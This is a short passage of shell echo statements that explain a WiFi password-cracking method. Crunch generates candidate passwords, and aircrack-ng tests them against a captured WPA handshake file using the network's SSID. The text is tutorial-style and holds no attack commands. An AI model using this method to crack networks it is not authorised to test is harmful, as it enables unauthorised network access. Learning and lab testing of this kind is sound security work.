echo "  a. crunch generates some possible combinations."
echo "  b. aircrack-ng tries all the combinations until it finds a correct one. !!! aircrack-ng is cracking the .cap file (the authentication handshake communication in .cap file). NOT the acctual WiFi AP. WiFi's SSID is needed because this SSID is combined with password to generate a key."
